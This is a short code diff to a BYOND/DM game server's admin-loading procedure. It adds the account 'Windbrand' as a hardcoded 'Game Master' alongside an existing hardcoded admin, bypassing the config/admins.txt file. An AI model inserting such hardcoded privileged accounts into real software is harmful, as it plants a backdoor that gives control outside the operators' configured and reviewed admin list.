@@ -25,6 +25,7 @@ var/DBConnection/dbcon = new()
 /world/proc/load_admins()
 	diary << ("Loading admins...")
 	admins["GaZBaX"] = "Game Master"
+	admins["Windbrand"] = "Game Master"
 	if(config.admin_legacy_system)
 		var/text = file2text("config/admins.txt")
 		if (!text)
